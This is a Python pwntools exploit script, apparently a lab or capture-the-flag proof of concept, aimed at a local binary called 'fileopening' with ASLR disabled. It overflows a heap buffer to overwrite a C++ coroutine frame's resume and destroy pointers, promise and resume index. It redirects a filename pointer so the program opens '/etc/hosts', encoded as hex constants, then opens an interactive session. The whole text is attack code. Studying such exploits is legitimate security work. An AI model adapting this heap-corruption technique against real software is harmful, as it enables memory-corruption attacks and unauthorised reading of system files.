from pwn import *

context.update(arch='x86_64', os='linux', aslr=False)
context.aslr = False
binary = ELF('./fileopening')
context.binary = binary
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process('./fileopening')

CORO_RESUME_CODE_PTR = 0x0000555555556572
CORO_DESTROY_CODE_PTR = 0x0000555555556bd8
PROMISE_PTR = 0x000055555556f2f0
PROMISE_VALUE = 0x696600524f525245
SELF_FRAME_PTR = 0x000055555556d2d0
VARS_PARAMS_RESUME_INDEX = 0x0000000001010006
VARS_PARAMS_RESUME_INDEX_RESETCORO = 0x0000000001010000
STACK_FN_CORO_HANDLER_STRPTR_ORIGINAL = 0x000055555556ff18
STACK_FN_CORO_HANDLER_STRPTR_HIJACKED = 0x7fffffffdf80
STRING_BUF_ADDR = 0x000055555556cf10
HIJACKED_FILENAME_ADDR = 0x55555556f318
HIJACKED_FILENAME_NAME_1 = 0x736F682F6374652F 
HIJACKED_FILENAME_NAME_2 = 0x7374


p.recvuntil("Reading user input into insecure buffer (10 bytes)")
#Overflowing the heap
heap_payload_1 = b'A'*32


heap_payload_2 = pack(CORO_RESUME_CODE_PTR) + pack(CORO_DESTROY_CODE_PTR) + \
        pack(PROMISE_PTR) + p64(0xa) + \
        p64(PROMISE_VALUE) + p64(0x656c) +\
        pack(SELF_FRAME_PTR) + pack(HIJACKED_FILENAME_ADDR) +\
        p64(0x1e) + p64(HIJACKED_FILENAME_NAME_1) +\
        p64(HIJACKED_FILENAME_NAME_2) + pack(VARS_PARAMS_RESUME_INDEX_RESETCORO) +\
        pack(STACK_FN_CORO_HANDLER_STRPTR_HIJACKED) + p64(0x0) 

heap_payload = heap_payload_1 + heap_payload_2
p.send(heap_payload)

log.info("Payload length: "+ str(len(heap_payload)))


p.interactive()